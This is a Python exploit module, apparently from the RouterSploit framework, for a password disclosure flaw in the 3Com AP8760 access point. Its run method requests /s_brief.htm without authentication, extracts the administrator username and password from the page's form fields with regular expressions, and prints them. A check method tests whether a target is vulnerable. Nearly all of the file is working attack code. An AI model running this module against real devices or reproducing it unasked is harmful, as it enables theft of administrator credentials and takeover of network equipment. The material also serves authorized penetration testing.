# rsf exploit module
# description: Exploits 3Com AP8760 password disclosure vulnerability.
# If the target is vulnerable it is possible to fetch credentials for administration user.

import re
import requests

class Exploit:
    __info__ = {
        "name": "3Com AP8760 Password Disclosure",
        "description": "Exploits 3Com AP8760 password disclosure vulnerability."
                       "If the target is vulnerable it is possible to fetch credentials for administration user.",
        "authors": (
            "Richard Brain",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://www.procheckup.com/procheckup-labs/pr07-40/",
        ),
        "devices": (
            "3Com AP8760",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        creds = []
        print("Sending payload request")
        response = requests.get(f"http://{self.target}:{self.port}/s_brief.htm")

        if response is None:
            return

        print("Extracting credentials")
        username = re.findall('<input type="text" name="szUsername" size=16 value="(.+?)">', response.text)
        password = re.findall('<input type="password" name="szPassword" size=16 maxlength="16" value="(.+?)">', response.text)

        if len(username) and len(password):
            print("Exploit success")
            creds.append((username[0], password[0]))
            print(f"Login: {username[0]} | Password: {password[0]}")
        else:
            print("Exploit failed - could not extract credentials")

    def check(self):
        response = requests.get(f"http://{self.target}:{self.port}/s_brief.htm")
        if response is None:
            return False

        if "szUsername" in response.text and "szPassword" in response.text:
            return True  # target is vulnerable

        return False  # target not vulnerable

